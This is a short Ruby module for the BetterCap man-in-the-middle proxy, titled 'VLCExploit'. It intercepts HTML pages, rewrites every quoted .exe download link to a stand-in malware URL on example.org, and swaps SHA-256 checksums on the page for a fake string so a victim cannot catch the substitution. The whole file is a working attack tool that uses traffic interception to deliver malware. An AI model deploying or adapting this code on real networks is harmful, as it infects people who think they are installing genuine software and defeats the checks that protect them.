class VLCExploit < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'VLCExploit',
    'Description' => 'Replace installation file',
    'Version'     => '1.0',
    'Author'      => "Andrea Draghetti",
    'License'     => 'GPL3'
  )
	def initialize
		opts = BetterCap::Context.get.options.servers
	end
 
	def on_request(request, response)
		# is it a html page?
		if response.content_type =~ /^text\/html.*/
			BetterCap::Logger.info "Exploit http://#{request.host}#{request.path}..".green
			response.body.gsub! %r/["']http:\/\/*[^\s]+\.(exe)["']/i, "http://example.org/malware.exr"
			response.body.gsub! /[a-f0-9]{64}/i, "fake_checksum_here"
		end
	end
end
